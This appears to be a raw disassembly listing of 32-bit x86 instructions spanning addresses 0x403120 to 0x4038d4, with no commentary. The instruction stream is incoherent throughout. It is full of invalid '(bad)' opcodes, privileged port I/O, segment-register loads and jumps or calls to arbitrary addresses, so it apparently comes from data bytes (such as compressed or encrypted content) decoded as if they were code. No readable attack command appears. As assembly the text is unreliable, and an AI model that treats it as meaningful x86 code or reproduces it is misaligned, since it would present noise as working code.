  403120:	ins    DWORD PTR es:[edi],dx
  403121:	outs   dx,BYTE PTR ds:[esi]
  403122:	inc    ebp
  403123:	jb     0x403175
  403125:	push   es
  403126:	or     BYTE PTR [esi+0x3cea274a],ah
  40312c:	cmp    eax,0x2ecac284
  403131:	sahf   
  403132:	mov    WORD PTR [esi+0x6bc656eb],ss
  403138:	je     0x4030d1
  40313a:	enter  0x2827,0x59
  40313e:	ds xchg ebp,eax
  403140:	ret    0xab8
  403143:	jnp    0x4030ed
  403145:	pop    ebx
  403146:	shl    dh,0x11
  403149:	rol    BYTE PTR [ebp+0x26],cl
  40314c:	sbb    dl,BYTE PTR [edi-0x59]
  40314f:	sbb    eax,0xc44fd419
  403154:	(bad)  [ecx+0x30f0e01e]
  40315a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40315b:	mov    dl,0x37
  40315d:	cdq    
  40315e:	stos   DWORD PTR es:[edi],eax
  40315f:	and    BYTE PTR [eax-0x77df16e4],al
  403165:	addr16 xor cl,bh
  403168:	aaa    
  403169:	or     eax,0x10bf9fcd
  40316e:	jo     0x403148
  403170:	lahf   
  403171:	(bad)  
  403173:	ja     0x4030fa
  403175:	scas   al,BYTE PTR es:[edi]
  403176:	dec    eax
  403177:	cs das 
  403179:	sbb    ebp,edx
  40317b:	in     eax,dx
  40317c:	and    esp,ebp
  40317e:	push   ds
  40317f:	out    dx,eax
  403180:	imul   eax,DWORD PTR [ebx],0xdf4d9777
  403186:	mov    ah,0x2b
  403188:	or     DWORD PTR [edx+0x42],edx
  40318b:	aad    0xf1
  40318d:	ins    DWORD PTR es:[edi],dx
  40318e:	or     esp,esi
  403190:	fild   WORD PTR [ecx+0x65314898]
  403196:	mov    ebx,0xece560b5
  40319b:	mov    edx,DWORD PTR [edi+0x62]
  40319e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40319f:	les    edi,FWORD PTR [eax-0x10]
  4031a2:	pop    esp
  4031a3:	jne    0x4031ef
  4031a5:	in     al,dx
  4031a6:	or     BYTE PTR [ebx-0x47],dh
  4031a9:	and    al,0xf3
  4031ab:	mov    dh,0x7
  4031ad:	cmp    BYTE PTR [edi+0x38],dh
  4031b0:	add    ecx,DWORD PTR [ebp+0x5794dc1b]
  4031b6:	lods   al,BYTE PTR ds:[esi]
  4031b7:	adc    ebx,DWORD PTR ds:0xa13572d0
  4031bd:	jbe    0x403145
  4031bf:	std    
  4031c0:	outs   dx,BYTE PTR gs:[esi]
  4031c2:	ins    BYTE PTR es:[edi],dx
  4031c3:	aas    
  4031c4:	int3   
  4031c5:	jno    0x403163
  4031c7:	fst    QWORD PTR [edi+0x14ae7756]
  4031cd:	xor    bl,BYTE PTR [ebx+0x1]
  4031d0:	lahf   
  4031d1:	add    ebx,DWORD PTR [ecx-0x5b722259]
  4031d7:	sub    esi,DWORD PTR [edx]
  4031d9:	and    ebp,DWORD PTR [ebx]
  4031db:	mov    ds:0x175d705c,eax
  4031e0:	mov    ah,0xd8
  4031e2:	xchg   esi,eax
  4031e3:	push   edx
  4031e4:	(bad)  
  4031e6:	fldcw  WORD PTR [eax-0x50]
  4031e9:	imul   edx,ecx,0x36
  4031ec:	xlat   BYTE PTR ds:[ebx]
  4031ed:	xor    eax,0xdfa4ed8
  4031f2:	push   ds
  4031f3:	out    dx,eax
  4031f4:	xchg   ebp,eax
  4031f5:	xchg   BYTE PTR [ebp-0x3fa167b5],dh
  4031fb:	shl    BYTE PTR [edx+0x26],0x7c
  4031ff:	or     DWORD PTR [ecx],ecx
  403201:	bsr    edi,DWORD PTR [esi+edi*4-0x409ab404]
  403209:	fisubr WORD PTR [ebp+0x4b]
  40320c:	pop    esi
  40320d:	push   eax
  40320e:	mov    ds:0x8216fd6f,eax
  403213:	push   0x6266b6db
  403218:	adc    al,0xff
  40321a:	test   DWORD PTR [edi-0x3993488d],0x5b05f672
  403224:	sub    BYTE PTR [esi+ebx*2],0x47
  403228:	imul   ebp,esi,0xffffffc8
  40322b:	lock out dx,al
  40322d:	adc    ah,BYTE PTR [esi+eax*2+0x66efea1d]
  403234:	xchg   DWORD PTR [ebp-0x522182e9],edx
  40323a:	scas   eax,DWORD PTR es:[edi]
  40323b:	fcom   QWORD PTR [eax+ebx*2+0x41d001a0]
  403242:	inc    ebx
  403243:	mov    BYTE PTR [ecx-0x7b7c312b],ch
  403249:	sti    
  40324a:	aaa    
  40324b:	cmp    al,0x9b
  40324d:	mov    ebp,DWORD PTR [ebp+0x60]
  403250:	imul   esp,DWORD PTR [edx+0x42ea3d68],0xc258a630
  40325a:	adc    al,0x6a
  40325c:	std    
  40325d:	jmp    0x40324f
  40325f:	sbb    BYTE PTR [ecx],bh
  403261:	pop    ds
  403262:	je     0x4032d5
  403264:	sbb    al,0xe1
  403266:	jo     0x40327c
  403268:	mov    dh,0xf6
  40326a:	cmp    dl,BYTE PTR [ebx+0x17854277]
  403270:	sbb    esp,DWORD PTR [edi+eax*1]
  403273:	sar    ah,cl
  403275:	popf   
  403276:	lods   eax,DWORD PTR ds:[esi]
  403277:	loopne 0x403228
  403279:	cmp    eax,DWORD PTR [ecx+esi*2+0x58]
  40327d:	retf   
  40327e:	shl    edi,0x28
  403281:	sti    
  403282:	mov    ds:0x8af98088,al
  403287:	(bad)  
  403288:	out    0x21,eax
  40328a:	add    ecx,esp
  40328c:	jp     0x4032a0
  40328e:	sbb    bl,dh
  403290:	(bad)  
  403292:	lahf   
  403293:	pusha  
  403294:	(bad)  [eax+0x7fe34531]
  40329a:	add    DWORD PTR [eax],edx
  40329c:	xlat   BYTE PTR ds:[ebx]
  40329d:	addr16 dec si
  4032a0:	push   esp
  4032a1:	push   edi
  4032a2:	iret   
  4032a3:	xor    esp,ecx
  4032a5:	iret   
  4032a6:	out    0xa6,eax
  4032a8:	fild   QWORD PTR [esi-0x45]
  4032ab:	test   BYTE PTR [eax+0x6b99268c],0x75
  4032b2:	push   ecx
  4032b3:	cmp    BYTE PTR [edi],dl
  4032b5:	and    eax,0xa34dbdbc
  4032ba:	xchg   ebp,eax
  4032bb:	outs   dx,DWORD PTR ds:[esi]
  4032bc:	lahf   
  4032bd:	ret    
  4032be:	into   
  4032bf:	das    
  4032c0:	loopne 0x403334
  4032c2:	daa    
  4032c3:	adc    DWORD PTR [ebp+eiz*8-0x7],ecx
  4032c7:	pop    ecx
  4032c8:	mov    WORD PTR [esi-0x63],gs
  4032cb:	in     eax,0x84
  4032cd:	sar    eax,cl
  4032cf:	rcl    BYTE PTR [edi],1
  4032d1:	sub    ebx,esi
  4032d3:	jl     0x403265
  4032d5:	mov    DWORD PTR [ebx+0x7b],ebx
  4032d8:	inc    edx
  4032d9:	(bad)  
  4032da:	dec    ebx
  4032db:	xchg   ebx,eax
  4032dc:	loopne 0x40330e
  4032de:	pop    ebx
  4032df:	into   
  4032e0:	jbe    0x403323
  4032e2:	daa    
  4032e3:	jmp    0x40335d
  4032e5:	jns    0x403291
  4032e7:	iret   
  4032e8:	sbb    eax,0xffffff91
  4032eb:	xchg   BYTE PTR [esi+0x8],bl
  4032ee:	inc    edi
  4032ef:	clc    
  4032f0:	and    DWORD PTR [ebx],ebp
  4032f2:	mov    DWORD PTR [edi-0x2669b68],esp
  4032f8:	mov    dh,0x31
  4032fa:	xor    al,0x42
  4032fc:	imul   esp,DWORD PTR [esi+0x7c],0x8cd4a57e
  403303:	xor    ecx,eax
  403305:	mov    esp,esi
  403307:	jns    0x40331b
  403309:	jae    0x4032a4
  40330b:	adc    esp,edx
  40330d:	or     DWORD PTR ss:[edi+0x6d72d338],esp
  403314:	js     0x403344
  403316:	mov    eax,ds:0xf99637cb
  40331b:	std    
  40331c:	dec    ebp
  40331d:	xchg   edx,eax
  40331e:	push   ecx
  40331f:	sbb    bh,dl
  403321:	loop   0x403331
  403323:	into   
  403324:	mov    esi,cs
  403326:	mov    al,0xa6
  403328:	es sti 
  40332a:	adc    eax,0xc9e7a1a4
  40332f:	les    eax,FWORD PTR [edi+edi*2]
  403332:	jae    0x403347
  403334:	jne    0x403315
  403336:	xchg   ebx,eax
  403337:	mov    ds:0x1d905c7b,al
  40333c:	add    BYTE PTR [ebx],dh
  40333e:	mov    dl,0x9a
  403340:	mov    DWORD PTR [ebp-0x71864271],edi
  403346:	ja     0x403330
  403348:	cmp    DWORD PTR [ebx+0x35],edi
  40334b:	icebp  
  40334c:	(bad)  
  40334d:	cmp    ebp,DWORD PTR [edi]
  40334f:	jno    0x40337d
  403351:	xchg   edi,eax
  403352:	lahf   
  403353:	mov    ch,ch
  403355:	pop    edx
  403356:	pusha  
  403357:	xchg   ebx,eax
  403358:	mov    ch,0x5
  40335a:	mov    esp,esi
  40335c:	add    BYTE PTR gs:[eax-0x78],dl
  403360:	xchg   edi,eax
  403361:	cli    
  403362:	push   cs
  403363:	pop    es
  403364:	pop    es
  403365:	(bad)  
  403366:	in     eax,dx
  403367:	loopne 0x4032f2
  403369:	sub    ebx,DWORD PTR [ecx]
  40336b:	aas    
  40336c:	xchg   ebp,eax
  40336d:	mov    ds:0x83afa62b,eax
  403372:	sti    
  403373:	and    al,0xed
  403375:	cs popa 
  403377:	sahf   
  403378:	std    
  403379:	xchg   ecx,eax
  40337a:	jecxz  0x403382
  40337c:	jno    0x40335c
  40337e:	xor    BYTE PTR [edi-0x41774087],ch
  403384:	dec    esi
  403385:	test   eax,0x62218fa0
  40338a:	test   BYTE PTR [ebx+0x65],bh
  40338d:	xchg   ecx,eax
  40338e:	out    dx,al
  40338f:	fst    DWORD PTR [ecx-0xe]
  403392:	mov    ds:0x4186f2e9,al
  403397:	mov    BYTE PTR [esi+0x72],al
  40339a:	dec    ebp
  40339b:	jne    0x40339e
  40339d:	cmp    esp,edx
  40339f:	out    0xb0,al
  4033a1:	mov    dh,0xcc
  4033a3:	ss iret 
  4033a5:	retf   
  4033a6:	cmp    al,0xea
  4033a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4033a9:	and    al,0xa8
  4033ab:	jno    0x4033bc
  4033ad:	popf   
  4033ae:	scas   eax,DWORD PTR es:[edi]
  4033af:	dec    edi
  4033b0:	pop    esp
  4033b1:	mov    bl,0x60
  4033b3:	icebp  
  4033b4:	mov    al,ds:0x608f9a56
  4033b9:	pushf  
  4033ba:	scas   al,BYTE PTR es:[edi]
  4033bb:	mov    cl,0xf6
  4033bd:	xchg   DWORD PTR [edi-0x60e0e69b],esp
  4033c3:	ins    BYTE PTR es:[edi],dx
  4033c4:	retf   
  4033c5:	mov    BYTE PTR [edi+eax*1+0x2f],0x4a
  4033ca:	mov    ds:0xb855bae8,al
  4033cf:	repnz stc 
  4033d1:	imul   edx,DWORD PTR [ebx-0x5dde4d1f],0x9f14b97a
  4033db:	or     BYTE PTR [ebp-0x3ef6e48e],cl
  4033e1:	ss xchg ebp,eax
  4033e3:	mov    edi,0x44dc85b9
  4033e8:	mov    esp,0x738456a
  4033ed:	jecxz  0x403400
  4033ef:	dec    esp
  4033f0:	out    dx,eax
  4033f1:	icebp  
  4033f2:	stc    
  4033f3:	dec    ebx
  4033f4:	test   BYTE PTR [edi+esi*4+0x5e],bl
  4033f8:	push   ss
  4033f9:	and    DWORD PTR [ebp+0x3e],eax
  4033fc:	fs inc ebx
  4033fe:	pop    edi
  4033ff:	adc    edi,0xfffffffd
  403402:	popf   
  403403:	dec    ebx
  403404:	int3   
  403405:	mov    cl,0x3c
  403407:	xor    DWORD PTR [edi],0xd3e0264e
  40340d:	scas   al,BYTE PTR es:[edi]
  40340e:	and    eax,DWORD PTR [esi]
  403410:	xchg   esi,eax
  403411:	stos   BYTE PTR es:[edi],al
  403412:	pop    es
  403413:	(bad)  
  403414:	outs   dx,BYTE PTR ds:[esi]
  403415:	xchg   DWORD PTR [edi+0x18],esp
  403418:	jg     0x40347c
  40341a:	dec    esi
  40341b:	fstp   TBYTE PTR [edi+edi*4]
  40341e:	pop    ss
  40341f:	and    bh,BYTE PTR [edi+eiz*1]
  403422:	aad    0xdc
  403424:	or     eax,0x957eac61
  403429:	mov    ebp,0x2423dd0f
  40342e:	dec    edx
  40342f:	gs aad 0x4d
  403432:	adc    dh,dh
  403434:	or     DWORD PTR [edi+0x74857327],esi
  40343a:	(bad)  
  40343b:	sub    DWORD PTR es:0x6bffb8f4,0xffffffa6
  403443:	inc    ebx
  403444:	rcl    edx,0x7d
  403447:	in     al,dx
  403448:	cmp    al,0xa9
  40344a:	test   DWORD PTR [eax+eiz*4-0x46],ecx
  40344e:	cli    
  40344f:	call   0x5bf85693
  403454:	scas   eax,DWORD PTR es:[edi]
  403455:	add    eax,0x3ee00b87
  40345a:	jecxz  0x403496
  40345c:	das    
  40345d:	sub    al,0x75
  40345f:	jne    0x40347e
  403461:	pushf  
  403462:	fidiv  WORD PTR [esi+0x2d]
  403465:	jb     0x403445
  403467:	imul   eax,DWORD PTR [esi-0x1b6d07ee],0xe8feecbd
  403471:	push   ss
  403472:	push   ss
  403473:	jl     0x40349f
  403475:	pop    ebx
  403476:	(bad)  
  403477:	fldln2 
  403479:	xor    DWORD PTR ds:0x3b97102a,ecx
  40347f:	sahf   
  403480:	retf   0x3c8c
  403483:	(bad)  
  403484:	retf   
  403485:	arpl   WORD PTR [edx+0x1c46ae82],si
  40348b:	(bad)  
  40348c:	into   
  40348d:	retf   0x9a97
  403490:	out    dx,eax
  403491:	mov    dl,0x3e
  403493:	pop    ebp
  403494:	inc    esi
  403495:	add    eax,0x7844b03f
  40349a:	clc    
  40349b:	cli    
  40349c:	nop
  40349d:	push   esp
  40349e:	jg     0x4034ef
  4034a0:	push   esp
  4034a1:	ret    
  4034a2:	dec    ebp
  4034a3:	test   DWORD PTR [eax+ebx*2],0xf272fc8f
  4034aa:	jl     0x4034c8
  4034ac:	cmp    eax,0x7431135e
  4034b1:	sbb    eax,0xecd705c0
  4034b6:	pop    esp
  4034b7:	inc    ebp
  4034b8:	cmp    DWORD PTR [eax+0x44efa5fd],ebp
  4034be:	pop    esp
  4034bf:	mov    ebx,0x65d0dad4
  4034c4:	sar    DWORD PTR [ecx],0xe4
  4034c7:	ds jnp 0x40351b
  4034ca:	jae    0x403467
  4034cc:	loopne 0x403540
  4034ce:	mov    dh,0x43
  4034d0:	mov    al,0x83
  4034d2:	jmp    0x40351e
  4034d4:	test   BYTE PTR [eax+0x4cd8de9e],0x3a
  4034db:	or     eax,0xa0a0276b
  4034e0:	and    ecx,edx
  4034e2:	aam    0x3c
  4034e4:	pop    es
  4034e5:	xor    DWORD PTR [eax-0x63dd223f],ebx
  4034eb:	imul   esi,DWORD PTR [ebx+ebp*1],0x28
  4034ef:	fwait
  4034f0:	sub    cl,dl
  4034f2:	movlps QWORD PTR [esi-0x7472c860],xmm0
  4034f9:	add    BYTE PTR [edi+0x327c32de],ch
  4034ff:	aad    0x97
  403501:	test   eax,0xeb7a04be
  403506:	fwait
  403507:	stc    
  403508:	xchg   ebp,eax
  403509:	loope  0x4034b4
  40350b:	(bad)  
  40350c:	push   ds
  40350d:	imul   ecx,DWORD PTR [eax+0x578c044c],0x870ec7a1
  403517:	mov    eax,0x6c5557f9
  40351c:	enter  0x4db,0xe1
  403520:	hlt    
  403521:	and    al,BYTE PTR [esi+0x48]
  403524:	aas    
  403525:	lods   al,BYTE PTR ds:[esi]
  403526:	dec    esp
  403527:	inc    ebx
  403528:	adc    DWORD PTR [edi-0x11d64370],ecx
  40352e:	and    dl,BYTE PTR [ecx+eiz*8+0x6f2d6588]
  403535:	jb     0x40358f
  403537:	addr16 rcr edi,cl
  40353a:	out    0x28,eax
  40353c:	imul   ecx,edx,0x33
  40353f:	daa    
  403540:	inc    esi
  403541:	scas   eax,DWORD PTR es:[edi]
  403542:	scas   eax,DWORD PTR es:[edi]
  403543:	ss (bad) 
  403545:	pop    esi
  403546:	mov    ds:0xc7c374f6,al
  40354b:	test   ah,ch
  40354d:	add    esp,DWORD PTR [edi-0x3e]
  403550:	aas    
  403551:	cmp    eax,0x2a61d7d
  403556:	ss popf 
  403558:	cmp    dh,ah
  40355a:	jge    0x40359b
  40355c:	inc    edx
  40355d:	fisttp QWORD PTR [esi+0x7c0a6b55]
  403563:	jg     0x4035e3
  403565:	les    ebp,FWORD PTR [esi-0x51]
  403568:	sub    DWORD PTR [ecx],0xffffffd9
  40356b:	inc    edx
  40356c:	add    al,0xee
  40356e:	call   ebp
  403570:	icebp  
  403571:	ret    0x30b3
  403574:	push   0xffffffe2
  403576:	xchg   ebp,eax
  403577:	xor    esi,edi
  403579:	mul    al
  40357b:	add    DWORD PTR [eax+0x4f35ee86],edx
  403581:	clc    
  403582:	xchg   esi,eax
  403583:	bound  ecx,QWORD PTR [ebp-0x4877f68b]
  403589:	or     BYTE PTR [edi],cl
  40358b:	in     al,dx
  40358c:	jl     0x40355d
  40358e:	mov    edi,0x242e0c2b
  403593:	push   cs
  403594:	paddsw mm6,mm3
  403597:	xlat   BYTE PTR ds:[ebx]
  403598:	dec    ecx
  403599:	jne    0x403592
  40359b:	add    dh,BYTE PTR [ecx+0x14]
  40359e:	out    dx,eax
  40359f:	xchg   ecx,edx
  4035a1:	mov    bh,0x93
  4035a3:	adc    BYTE PTR [eax],cl
  4035a5:	icebp  
  4035a6:	fldl2e 
  4035a8:	pop    ebx
  4035a9:	imul   edx,DWORD PTR [esi],0x7e
  4035ac:	fs stos BYTE PTR es:[edi],al
  4035ae:	cmp    eax,0xf176240a
  4035b3:	dec    edx
  4035b4:	dec    edi
  4035b5:	adc    DWORD PTR [edx],edx
  4035b7:	inc    ecx
  4035b8:	and    bh,al
  4035ba:	fsubr  DWORD PTR [eax-0x6a]
  4035bd:	or     bh,BYTE PTR [ecx]
  4035bf:	inc    esp
  4035c1:	js     0x4035da
  4035c3:	test   eax,0x19c5d1a3
  4035c8:	cwde   
  4035c9:	jne    0x403597
  4035cb:	push   ecx
  4035cc:	pop    ss
  4035cd:	ret    0x1536
  4035d0:	add    DWORD PTR [ebx-0x2a0bcccb],0xffffffdf
  4035d7:	les    ebp,FWORD PTR [edx]
  4035d9:	push   edx
  4035da:	or     edi,ebx
  4035dc:	push   0x7047a197
  4035e1:	xchg   ebx,eax
  4035e2:	daa    
  4035e3:	xlat   BYTE PTR ds:[ebx]
  4035e4:	in     al,dx
  4035e5:	out    0x76,eax
  4035e7:	push   ss
  4035e8:	mov    ah,0x58
  4035ea:	in     al,0x97
  4035ec:	js     0x403614
  4035ee:	sbb    al,0x1a
  4035f0:	je     0x4035fd
  4035f2:	lods   al,BYTE PTR ds:[esi]
  4035f3:	rol    al,cl
  4035f5:	pop    edx
  4035f6:	push   ebp
  4035f7:	(bad)  
  4035f8:	fadd   QWORD PTR [eax+0x6956bbf6]
  4035fe:	in     al,0xcc
  403600:	mov    dl,0x3b
  403602:	scas   al,BYTE PTR es:[edi]
  403603:	sub    DWORD PTR [edi],edi
  403605:	aad    0x7c
  403607:	mov    esp,0x79784043
  40360c:	adc    eax,0xdb4b334a
  403611:	daa    
  403612:	nop
  403613:	test   BYTE PTR [esi],cl
  403615:	mov    esp,0xcadb45df
  40361a:	mov    cs,WORD PTR [esi+0x5]
  40361d:	imul   edi,DWORD PTR [edi-0x2a],0xd55b146e
  403624:	and    esp,DWORD PTR [eax+0x2d]
  403627:	into   
  403628:	push   ecx
  403629:	xabort 0x9
  40362c:	shr    DWORD PTR [eax],cl
  40362e:	jae    0x403654
  403630:	pop    esi
  403631:	stos   DWORD PTR es:[edi],eax
  403632:	icebp  
  403633:	cmp    bh,cl
  403635:	or     dl,BYTE PTR [eax-0x68]
  403638:	push   es
  403639:	mov    ah,BYTE PTR [edx]
  40363b:	in     eax,dx
  40363c:	add    ch,bh
  40363e:	add    eax,0x117004b4
  403643:	cs cmp al,0x63
  403646:	cmc    
  403647:	ficomp DWORD PTR [esi-0x16]
  40364a:	cli    
  40364b:	mov    fs,WORD PTR [eax-0x75]
  40364e:	call   0xf2eefbe1
  403653:	cld    
  403654:	nop
  403655:	sub    edx,DWORD PTR [ecx-0x7d]
  403658:	in     eax,0x9c
  40365a:	out    0x87,eax
  40365c:	retf   0xb7d7
  40365f:	cmp    DWORD PTR [ebp+0x2a7d189a],ecx
  403665:	(bad)  
  403666:	aas    
  403667:	mov    ch,dh
  403669:	push   esi
  40366a:	loop   0x403610
  40366c:	pop    ebp
  40366d:	stos   DWORD PTR es:[edi],eax
  40366e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40366f:	add    al,0xcd
  403671:	jmp    0x403638
  403673:	mov    bl,0x99
  403675:	loop   0x40367c
  403677:	xchg   edx,eax
  403678:	shl    DWORD PTR [eax+0x33],cl
  40367b:	cmp    esi,DWORD PTR ds:0xa0f00d27
  403681:	call   0x121b:0xde5598d9
  403688:	jge    0x40366c
  40368a:	rep stos DWORD PTR es:[edi],eax
  40368c:	inc    esp
  40368d:	jmp    0x2bccd49d
  403692:	mov    esi,0x25ff788
  403697:	mov    ds:0x71186e0d,eax
  40369c:	retf   
  40369d:	sbb    ch,BYTE PTR [ebp-0xf]
  4036a0:	cmp    edi,eax
  4036a2:	dec    edx
  4036a3:	inc    ecx
  4036a4:	fs mov ebx,ebx
  4036a7:	leave  
  4036a8:	cmp    DWORD PTR [esi+0x46],edx
  4036ab:	xlat   BYTE PTR ds:[ebx]
  4036ac:	push   edx
  4036ad:	pop    ds
  4036ae:	add    al,0x22
  4036b0:	icebp  
  4036b1:	call   DWORD PTR [esi-0x60]
  4036b4:	sbb    ebx,DWORD PTR [eax+0xd]
  4036b7:	adc    al,0x37
  4036b9:	retf   0xcf64
  4036bc:	lods   al,BYTE PTR ds:[esi]
  4036bd:	imul   BYTE PTR [eax]
  4036bf:	sbb    DWORD PTR [edi+0x5c3f2b9e],esp
  4036c5:	sbb    BYTE PTR [ecx],dh
  4036c7:	pusha  
  4036c8:	adc    DWORD PTR [ebx],esp
  4036ca:	into   
  4036cb:	pop    ss
  4036cc:	cmp    DWORD PTR [esi-0x79],0xf7418ee7
  4036d3:	jl     0x403686
  4036d5:	loopne 0x4036b8
  4036d7:	and    BYTE PTR [bx+di-0x1ae6],bh
  4036dc:	pop    eax
  4036dd:	loop   0x40373c
  4036df:	outs   dx,BYTE PTR ds:[esi]
  4036e0:	jge    0x4036af
  4036e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4036e3:	clc    
  4036e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4036e5:	outs   dx,BYTE PTR ds:[esi]
  4036e6:	fisubr DWORD PTR ds:0x67283ecc
  4036ec:	sub    bl,BYTE PTR [ebx+0x77daf4a5]
  4036f2:	mov    DWORD PTR [ecx+0x157b13a3],edi
  4036f8:	pop    ds
  4036f9:	pop    ds
  4036fa:	mov    cl,BYTE PTR [edx-0x25]
  4036fd:	add    eax,0xd64458ca
  403702:	add    DWORD PTR [edi-0x76],0x4a
  403706:	pop    ds
  403707:	iret   
  403708:	jmp    0x4036c7
  40370a:	loopne 0x403701
  40370c:	and    ch,bh
  40370e:	inc    ebp
  40370f:	jp     0x403772
  403711:	call   0xae7d5fe1
  403716:	mov    esp,0x49d31c95
  40371b:	push   es
  40371c:	add    edx,DWORD PTR [ebx+ecx*8-0x67]
  403720:	aad    0xd8
  403722:	in     al,dx
  403723:	bound  ebp,QWORD PTR [ecx+ecx*4]
  403726:	and    eax,0x71ca5f3d
  40372b:	push   esp
  40372c:	cwde   
  40372d:	jg     0x4037a0
  40372f:	push   es
  403730:	pop    ss
  403731:	cld    
  403732:	xchg   ebx,eax
  403733:	leave  
  403734:	jge    0x40375a
  403736:	push   esi
  403737:	jmp    0x4036d9
  403739:	cmc    
  40373a:	outs   dx,BYTE PTR ds:[esi]
  40373b:	clc    
  40373c:	test   al,0xe1
  40373e:	(bad)  
  40373f:	and    ah,ch
  403741:	dec    ebp
  403742:	and    DWORD PTR [edi-0xf],ebp
  403745:	les    eax,FWORD PTR [edx-0x6c2e7554]
  40374b:	pop    ss
  40374c:	adc    DWORD PTR [esi],0x6f
  40374f:	inc    edx
  403750:	xor    dh,cl
  403752:	popf   
  403753:	xlat   BYTE PTR ds:[ebx]
  403754:	ror    eax,cl
  403756:	jno    0x40371c
  403758:	dec    esp
  403759:	scas   al,BYTE PTR es:[edi]
  40375a:	jae    0x403751
  40375c:	std    
  40375d:	(bad)  
  40375e:	dec    esp
  40375f:	outs   dx,DWORD PTR ds:[esi]
  403760:	into   
  403761:	push   edx
  403762:	mov    ds:0xa6c5062,al
  403767:	push   edi
  403768:	push   esp
  403769:	fisub  WORD PTR [esi+esi*1]
  40376c:	inc    ebp
  40376d:	add    DWORD PTR [eax-0x65bd9a94],eax
  403773:	or     ah,bl
  403775:	loop   0x40376e
  403777:	mov    ds:0xa24b2f55,eax
  40377c:	push   ds
  40377d:	push   ebx
  40377e:	dec    ebp
  40377f:	popa   
  403780:	add    eax,0x48e41cc
  403785:	jne    0x403745
  403787:	jg     0x4037e8
  403789:	in     al,dx
  40378a:	fst    DWORD PTR [ebp+ebp*1+0x29773e8b]
  403791:	cmp    ebp,DWORD PTR [ebx+0x67]
  403794:	(bad)  
  403795:	out    0xf4,eax
  403797:	fldpi  
  403799:	jne    0x4037a0
  40379b:	xor    BYTE PTR [edi+0x33ff26a],bl
  4037a1:	adc    DWORD PTR [edx-0x3af3dc6a],0x36
  4037a8:	xor    eax,0x65cc7bac
  4037ad:	lods   al,BYTE PTR ds:[esi]
  4037ae:	int    0xd0
  4037b0:	dec    ebx
  4037b1:	lods   eax,DWORD PTR ds:[esi]
  4037b2:	adc    al,0x20
  4037b4:	mov    bl,BYTE PTR [edi]
  4037b6:	dec    edx
  4037b7:	dec    edi
  4037b8:	cmp    ch,dl
  4037ba:	int3   
  4037bb:	add    BYTE PTR es:[edx+0x1a3df9f4],dh
  4037c2:	and    al,0xa0
  4037c4:	cmp    cl,BYTE PTR [esi]
  4037c6:	push   ebp
  4037c7:	mov    BYTE PTR [ebx-0x3a],dh
  4037ca:	dec    edx
  4037cb:	les    edx,FWORD PTR [edx+esi*4]
  4037ce:	add    DWORD PTR [ecx+esi*2+0x7],esi
  4037d2:	hlt    
  4037d3:	cmp    BYTE PTR [esi+0x71],cl
  4037d6:	stos   BYTE PTR es:[edi],al
  4037d7:	dec    ebx
  4037d8:	jl     0x403793
  4037da:	popa   
  4037db:	jbe    0x403821
  4037dd:	mov    esp,DWORD PTR [ebp+0x23]
  4037e0:	jmp    0x3c1b39ce
  4037e5:	dec    esp
  4037e6:	mov    edx,0x6cf4116a
  4037eb:	nop
  4037ec:	lods   eax,DWORD PTR ds:[esi]
  4037ed:	fst    DWORD PTR [esi]
  4037ef:	mov    eax,ds:0xe951d550
  4037f4:	push   ss
  4037f5:	mov    edi,0x806b2f27
  4037fa:	(bad)  
  4037fb:	xchg   esp,eax
  4037fc:	mov    bh,dl
  4037fe:	pop    ebx
  4037ff:	(bad)  
  403800:	xor    ebx,DWORD PTR [edi-0x58be7326]
  403806:	into   
  403807:	daa    
  403808:	jge    0x40385e
  40380a:	lock xor esp,eax
  40380d:	cld    
  40380e:	lock and al,0x40
  403811:	xor    bl,bh
  403813:	sub    ch,BYTE PTR [esi-0x1b]
  403816:	imul   esp,ebp,0xb055be35
  40381c:	or     eax,ebx
  40381e:	mov    ss,WORD PTR [ecx]
  403820:	mov    eax,ds:0xeb65f0be
  403825:	add    bl,BYTE PTR [edi+esi*4-0x6296b8ab]
  40382c:	push   ds
  40382d:	stos   DWORD PTR es:[edi],eax
  40382e:	or     edx,0xc12c6a36
  403834:	imul   esp,DWORD PTR [ebx],0x7b2fe906
  40383a:	cld    
  40383b:	ret    0x8367
  40383e:	xor    BYTE PTR [esi-0x299f6d42],bh
  403844:	shl    BYTE PTR [esi-0x3066cc4b],cl
  40384a:	and    eax,0x64e47bc6
  40384f:	data16 mov es,WORD PTR [edx-0xf]
  403853:	data16 mov ds:0xf318d4a8,al
  403859:	ret    0xb3b7
  40385c:	xor    BYTE PTR [esi+0x76302155],ah
  403862:	cmp    eax,0x4807ed8a
  403867:	and    eax,0xe4b754d1
  40386c:	adc    eax,0x506b2698
  403871:	(bad)  
  403872:	aaa    
  403873:	xchg   ebx,eax
  403874:	cmc    
  403875:	sub    dl,BYTE PTR [edi-0x80]
  403878:	mov    ch,0xf9
  40387a:	ds in  eax,0xbd
  40387d:	add    al,BYTE PTR [ecx+0x46]
  403880:	fcomp  st(2)
  403882:	xor    DWORD PTR [edi+0x40],ebx
  403885:	mov    es,WORD PTR [esi+esi*1+0xa8749eb]
  40388c:	xchg   ecx,eax
  40388d:	out    0xc3,eax
  40388f:	loopne 0x403890
  403891:	jb     0x4038d6
  403893:	push   esi
  403894:	pop    es
  403895:	jecxz  0x4038a7
  403897:	add    eax,0x3ddda694
  40389c:	out    0xc5,eax
  40389e:	loope  0x4038bd
  4038a0:	and    edx,DWORD PTR [esi]
  4038a2:	imul   edx,DWORD PTR [ebp-0x1a],0xce5e7384
  4038a9:	sbb    eax,0xa1f46f25
  4038ae:	in     eax,0x20
  4038b0:	pop    edi
  4038b1:	nop
  4038b2:	dec    esp
  4038b3:	jae    0x40390c
  4038b5:	rep ins BYTE PTR es:[edi],dx
  4038b7:	icebp  
  4038b8:	jb     0x403845
  4038ba:	sub    BYTE PTR [ebx],cl
  4038bc:	dec    ebp
  4038bd:	inc    esi
  4038be:	bound  eax,QWORD PTR [eax-0xbdcb6df]
  4038c4:	cdq    
  4038c5:	push   edx
  4038c6:	out    0x48,al
  4038c8:	test   BYTE PTR [ecx],al
  4038ca:	daa    
  4038cb:	mov    edx,0xd66388a1
  4038d0:	std    
  4038d1:	cli    
  4038d2:	in     al,0xe
  4038d4:	sbb    BYTE PTR [esi+0x26],bl
